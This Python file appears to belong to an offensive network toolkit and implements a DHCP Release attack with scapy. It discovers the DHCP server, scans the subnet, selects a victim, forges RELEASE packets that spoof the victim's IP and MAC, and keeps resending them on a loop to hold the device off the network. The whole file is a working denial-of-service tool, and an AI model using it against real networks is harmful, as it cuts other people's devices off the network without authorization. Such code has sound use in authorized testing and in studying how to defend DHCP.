import time
import threading
from attacks.base import BaseAttack
from recon.network_scan import scan_subnet
from recon.target_selector import select_device
from recon.dhcp_discover import find_dhcp_server
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, mac2str

class ReleaseAttack(BaseAttack):
    """
    DHCP Release Attack.
    Sends DHCP RELEASE messages to the server, releasing leases for specified IPs.
    """

    def __init__(self, iface, logger=None, mantain_interval=30, maintain_count=None, mantain_timeout=None):
        super().__init__(iface, logger)
        self.target_ip = None
        self.target_mac = None
        self.server_ip = None
        self.server_mac = None
        self.maintain_interval = mantain_interval
        self.maintain_count = maintain_count
        self.maintain_timeout = mantain_timeout

    def send_dhcp_release(self, iface: str, client_ip: str, client_mac: str, server_ip: str, server_mac: str):
        pkt = (
            Ether(src=client_mac, dst=server_mac)
            / IP(src=client_ip, dst=server_ip)
            / UDP(sport=68, dport=67)
            / BOOTP(
                op=1,
                ciaddr=client_ip,
                chaddr=mac2str(client_mac),
            )
            / DHCP(
                options=[
                    ("message-type", "release"),
                    ("server_id", server_ip),
                    "end",
                ]
            )
        )

        sendp(pkt, iface=iface, verbose=False)

    def maintain_target_lease(self):
        while (self.maintain_count is None or self.maintain_count > 0) and (self.maintain_timeout is None or self.maintain_timeout > 0) and not self.stopped:
            self.logger.info("Maintaining lease for IP: %s", self.target_ip)

            self.logger.debug("continuing to maintain lease for %s seconds", self.maintain_interval)
            if self.maintain_count is not None:
                self.maintain_count -= 1
            self.logger.debug("remaining maintain count: %s", self.maintain_count)
            if self.maintain_timeout is not None:
                self.maintain_timeout -= self.maintain_interval

            self.logger.info("Scanning subnet to find target's current IP for MAC: %s", self.target_mac)
            devices = scan_subnet(self.iface)
            self.logger.debug("Scan results: %s", devices)

            self.logger.debug("Looking for target MAC %s in scan results", self.target_mac)
            self.target_ip = next((d["ip"] for d in devices if d["mac"] == self.target_mac), None)
            self.logger.debug("Found target IP: %s for MAC: %s", self.target_ip, self.target_mac)

            if not self.target_ip:
                self.logger.warning("Target MAC %s not found in scan results (likely hasn't re-acquired an IP yet). Skipping this cycle.", self.target_mac)
                time.sleep(self.maintain_interval)
                continue


            self.logger.info("Sending DHCP RELEASE for IP: %s", self.target_ip)
            self.send_dhcp_release(
                iface=self.iface,
                client_ip=self.target_ip,
                client_mac=self.target_mac,
                server_ip=self.server_ip,
                server_mac=self.server_mac,
            )
            self.logger.info("DHCP RELEASE sent successfully for IP: %s", self.target_ip)
            time.sleep(self.maintain_interval)

        
        
    def run(self):
        try:
            self.logger.info("Discovering DHCP server on interface %s...", self.iface)
            device_info = find_dhcp_server(self.iface)
            self.server_ip, self.server_mac = device_info["ip"], device_info["mac"]
            self.logger.info("DHCP server found: IP=%s MAC=%s", self.server_ip, self.server_mac)

            self.logger.info("Scanning subnet for devices...")
            devices = scan_subnet(self.iface)

            self.logger.info("Selecting target device to release lease from...")
            selection = select_device(devices, server_ip=self.server_ip)
            self.logger.info("Selected target device: IP=%s MAC=%s", selection["target_ip"], selection["target_mac"])

            self.target_ip, self.target_mac = selection["target_ip"], selection["target_mac"]
            self.logger.info("Sending DHCP RELEASE for IP: %s", self.target_ip)
            self.send_dhcp_release(
                iface=self.iface,
                client_ip=self.target_ip,
                client_mac=self.target_mac,
                server_ip=self.server_ip,
                server_mac=self.server_mac,
            )
            self.logger.info("DHCP RELEASE sent successfully for IP: %s", self.target_ip)

            manage_thread = threading.Thread(target=self.maintain_target_lease, daemon=True)
            manage_thread.start()
            manage_thread.join()

        except RuntimeError as e:
            self.logger.error(str(e))
            return

    @classmethod
    def configure_parser(cls, parser):
        parser.add_argument("--maintain-interval", type=int, default=30,
                            help="Interval in seconds to maintain the lease (default: 30)")
        parser.add_argument("--maintain-count", type=int, default=None,
                            help="Number of times to maintain the lease (default: unlimited)")
        parser.add_argument("--maintain-timeout", type=int, default=None,
                            help="Total time in seconds to maintain the lease (default: unlimited)")

    @classmethod
    def from_args(cls, args):
        if args.maintain_timeout is not None and args.maintain_timeout <= args.maintain_interval:
            raise ValueError("maintain_timeout must be greater than maintain_interval")
        return cls(
            iface=args.iface,
            mantain_interval=args.maintain_interval,
            maintain_count=args.maintain_count,
            mantain_timeout=args.maintain_timeout,
        )